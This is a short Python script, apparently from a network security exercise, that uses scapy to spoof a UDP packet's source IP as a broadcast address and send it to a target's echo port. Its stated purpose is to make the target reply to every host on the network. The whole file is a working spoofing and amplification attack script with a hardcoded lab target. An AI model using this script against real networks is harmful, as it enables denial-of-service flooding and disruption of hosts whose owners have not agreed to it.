"""\
This script forges the source IP of a UDP packet sent to the target.
Using a broadcast address in the source IP makes the target send an echo answer to everyone in the network.z
Change variables to need before running.
This script needs sudoers privileges to execute.

Author: angrycybercat

Usage: sudo python joueur4_broad.py
"""

from scapy.all import *

# target ip
ip_destination = "192.168.122.62"  

# broadcast
ip_source_broadcast = "192.168.122.255"  

# Port 7 "echo" port
port_destination = 7

message = "Hello, UDP Echo!"

udp_packet = IP(src=ip_source_broadcast, dst=ip_destination)/UDP(dport=port_destination)/Raw(load=message)

send(udp_packet)

print(f"Message envoyé: {message}")
